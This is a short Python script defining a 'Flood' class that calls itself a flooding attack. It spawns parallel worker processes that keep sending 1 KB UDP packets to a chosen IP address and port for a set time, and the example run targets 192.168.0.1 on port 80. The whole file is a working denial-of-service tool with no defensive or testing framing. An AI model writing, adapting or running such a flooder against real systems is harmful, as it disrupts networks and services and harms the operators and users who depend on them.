import multiprocessing
import socket
import time


class Flood:
    """
    Class to perform a simple flooding attack.
    """

    def __init__(self, target_ip, target_port):
        """
        Initialize the Flood class with the target IP and port.

        :param target_ip: IP address of the target.
        :param target_port: Port of the target.
        """
        self.target_ip = target_ip
        self.target_port = target_port


    def _send_packet(self):
        """
        Sends a single packet to the target. 
        This method is intended to be run by a multiprocessing worker.
        """
        try:
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)

            # Random data to send
            packet = bytes(1024)  # 1 KB packet of zeros
            sock.sendto(packet, (self.target_ip, self.target_port))
        except Exception as e:
            print(f"Error sending packet: {e}")
        finally:
            sock.close()


    def attack(self, workers=10, duration=30):
        """
        Start the flooding attack.

        :param workers: Number of parallel workers to use.
        :param duration: Duration of the attack in seconds.
        """
        print(f"Starting attack on {self.target_ip}:{self.target_port} with {workers} workers for {duration} seconds.")

        # Create a pool of worker processes
        process_pool = []
        for _ in range(workers):
            process = multiprocessing.Process(target=self._worker, args=(duration,))
            process_pool.append(process)
            process.start()

        # Wait for all processes to complete
        for process in process_pool:
            process.join()

        print("Attack finished.")


    def _worker(self, duration):
        """
        Worker function to continuously send packets for the specified duration.
        """
        end_time = time.time() + duration
        while time.time() < end_time:
            self._send_packet()


# Example usage
if __name__ == "__main__":
    # Replace with actual target IP and port
    target_ip = "192.168.0.1"
    target_port = 80


    flooder = Flood(target_ip, target_port)
    flooder.attack(workers=5, duration=10)
